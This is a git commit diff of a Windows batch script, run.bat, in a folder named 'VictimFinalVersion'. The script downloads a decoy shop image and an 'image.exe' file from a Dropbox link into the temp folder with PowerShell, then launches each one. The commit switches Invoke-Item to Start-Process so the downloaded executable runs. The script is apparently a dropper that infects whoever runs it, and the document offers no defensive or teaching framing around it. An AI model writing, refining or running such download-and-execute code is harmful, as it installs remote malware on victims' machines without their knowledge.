5beb2c8c89d0af0f5f3dd8a9168c6218d888e904
devkaare <kaarehofferdal@gmail.com>
2025-02-02 04:49:48 +0100

    Feat

--- VictimFinalVersion/run.bat
+++ VictimFinalVersion/run.bat
@@ -4,8 +4,9 @@ setlocal enabledelayedexpansion
 set files="https://www.homedora.com/cdn/shop/files/UrlaAngel04Cream_8_1_1.jpg" "https://www.dropbox.com/scl/fi/aye26mdzpnsk7k7ozrjw2/image.exe?rlkey=z0xqqilboj5m9xbskio0xio2e&st=tj3b5ej3&dl=0"
 
 for %%i in (%files%) do (
-    set "fileName=%TEMP%\%%~nxi"
-    powershell.exe -Command "(New-Object System.Net.WebClient).DownloadFile('%%i', '!fileName!'); Invoke-Item '!fileName!'"
+	set "fileName=%TEMP%\%%~nxi"
+	powershell.exe -Command "(New-Object System.Net.WebClient).DownloadFile('%%i', '!fileName!'); Start-Process '!fileName!'"
 )
 
 endlocal
+
